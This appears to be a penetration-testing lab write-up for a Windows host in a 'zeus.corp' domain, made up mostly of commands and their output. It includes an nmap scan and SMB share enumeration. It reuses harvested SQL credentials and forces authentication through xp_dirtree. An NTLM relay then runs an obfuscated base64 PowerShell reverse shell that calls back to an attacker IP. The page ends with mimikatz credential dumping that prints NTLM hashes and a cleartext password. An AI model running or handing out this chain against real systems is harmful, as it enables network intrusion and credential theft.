# CLIENT01 .159 \[W]

## Domain Users

svc\_mssql$::zeus:dec049a0f641e128:50E7FE7E9C3CB9F69F4EB8814BAB6F9D:01010000000000008075A5403264DC017A5B0C036E06E3A400000000020008003200590035004D0001001E00570049004E002D00300052004C00500041004D003600340054003900450004003400570049004E002D00300052004C00500041004D00360034005400390045002E003200590035004D002E004C004F00430041004C00030014003200590035004D002E004C004F00430041004C00050014003200590035004D002E004C004F00430041004C00070008008075A5403264DC0106000400020000000800300030000000000000000000000000300000E47DE231B9791568C6078B3127F611BC86924321C0C99B0CCB88B14DF9E401830A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380030000000000000000000

## Enumeration

192.168.209.158

```
Nmap scan report for 192.168.178.159
Host is up (0.044s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  tcpwrapped
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-02T01:01:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

`nxc smb 192.168.209.159 -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True`

{% code title="connection.sql  [From 'SQL' SMB share]" %}
```
$SqlServer    = 'DC01'
$Database     = 'master'
$SqlAuthLogin = 'zeus.corp\db_user'
$SqlAuthPw    = 'Password123!'
# query to show changes
$Query = '
SELECT @@SERVERNAME AS [ServerName]
    , des.login_name
    , DB_NAME()   AS [DatabaseName]
    , dec.net_packet_size
    , @@LANGUAGE  AS [Language]
    , des.program_name
    , des.host_name
FROM sys.dm_exec_connections dec
JOIN sys.dm_exec_sessions des ON dec.session_id = des.session_id
WHERE dec.session_id = @@SPID
'

### Add Additional queries here ### 
```
{% endcode %}

### Ports

MSSQL on DC01

`└─$ impacket-mssqlclient zeus.corp/db_user:'Password123!'@192.168.209.158 -windows-auth`

`EXEC master.sys.xp_dirtree '\\192.168.45.180\myshare',1, 1`

### Local Users

## Initial Foothold



## PrivEsc

NTLM relay from svc\_mssql on DC01 auth here and execute reverse shell

{% code overflow="wrap" %}
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.209.159 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' -debug

```
{% endcode %}

## Post Exploitation

`.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit`

```
         [00000003] Primary
         * Username : o.foller
         * Domain   : zeus
         * NTLM     : decca5b9babc228de4cedeb29a6b9abf
         * SHA1     : d570701c87b24e555619ccd3a9aadeb12c126629
         * DPAPI    : f675788d44c8293071ee2cabde5fb136
        tspkg :
        wdigest :
         * Username : o.foller
         * Domain   : zeus
         * Password : (null)
        kerberos :
         * Username : o.foller
         * Domain   : ZEUS.CORP
         * Password : EarlyMorningFootball777

```
